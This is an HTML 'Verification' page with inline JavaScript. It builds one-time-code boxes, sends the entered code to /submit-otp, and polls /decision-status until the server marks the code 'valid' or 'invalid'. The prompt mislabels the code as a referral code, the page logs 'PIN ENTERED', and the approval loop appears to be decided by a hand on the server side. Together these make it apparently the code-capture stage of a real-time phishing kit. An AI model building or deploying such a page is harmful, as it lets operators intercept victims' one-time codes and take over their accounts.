<!DOCTYPE html>
<html>

<head>
    <title>Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Verification</h2>

    <!-- 🔄 LOADER -->
    <div class="loader"></div>

    <p style="text-align:center; margin-top:15px;">
    Please enter your referral code below to continue.
</p>

    <!-- 🔢 OTP BOXES -->
    <div id="otpBoxes" style="display:flex; justify-content:center; gap:10px; margin-top:20px;"></div>

    <!-- BUTTON -->
    <button class="login-btn" onclick="submitOTP()">Continue</button>

</div>

<div class="footer"></div>

<script>
// get OTP length (5 or 6)
const length = parseInt(localStorage.getItem("otpLength")) || 5;

const container = document.getElementById("otpBoxes");

localStorage.removeItem("otpLength");

fetch("/clear-decision", { method: "POST" });

// create boxes dynamically
for (let i = 0; i < length; i++) {
    const input = document.createElement("input");
    input.type = "text";
    input.maxLength = 1;
    input.className = "pin-box";

    input.style.width = "45px";
    input.style.height = "45px";
    input.style.textAlign = "center";
    input.style.fontSize = "18px";
    input.style.border = "1px solid #ccc";
    input.style.borderRadius = "5px";

    container.appendChild(input);
}

// auto move between inputs
const inputs = document.querySelectorAll(".pin-box");

inputs.forEach((input, index) => {

    input.addEventListener("input", () => {
        input.value = input.value.replace(/[^0-9]/g, "");

        if (input.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });

    input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
            inputs[index - 1].focus();
        }
    });

});

// submit OTP
async function submitOTP() {
if (window.isSubmitting) return;
window.isSubmitting = true;

    let otp = "";

    inputs.forEach(input => {
        otp += input.value;
    });

    if (otp.length != length) {
        showError("Enter full code");
        return;
    }
        console.log("PIN ENTERED:", otp);

    // ✅ SEND OTP TO SERVER
    const res = await fetch("/submit-otp", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ otp })
    });

    const data = await res.json();

    if (data.success) {
       showError("Code submitted. Waiting for verification..."); 
    } else {
      showError("Error submitting code");  
    }
window.isSubmitting = false;

}

let isRedirecting = false;

const decisionChecker = setInterval(async () => {
  if (isRedirecting) return;

  try {
    const res = await fetch("/decision-status");
    const data = await res.json();

    if (data.decision === "valid") {
      isRedirecting = true;
      clearInterval(decisionChecker);

      document.querySelector(".container").innerHTML =
  "<h2 style='text-align:center'>Approved...</h2>";

      setTimeout(() => {
        window.location.href = "/dashboard.html";
      }, 1500);
    }

    if (data.decision === "invalid") {
      showError("Invalid code. Try again.");
    }

  } catch (err) {
    console.log("Waiting decision...");
  }

}, 2000);

function showLoaderAndGo(url) {
    document.getElementById("pageLoader").style.display = "block";
    setTimeout(() => {
        window.location.href = url;
    }, 800);
    }
function showError(msg) {
  let box = document.getElementById("errorBox");

  if (!box) {
    box = document.createElement("div");
    box.id = "errorBox";
    box.style.color = "red";
    box.style.textAlign = "center";
    box.style.marginTop = "10px";
    document.querySelector(".container").appendChild(box);
  }

  box.innerText = msg;
}

</script>
<div id="pageLoader" class="loader" style="display:none;"></div>
</body>
</html>
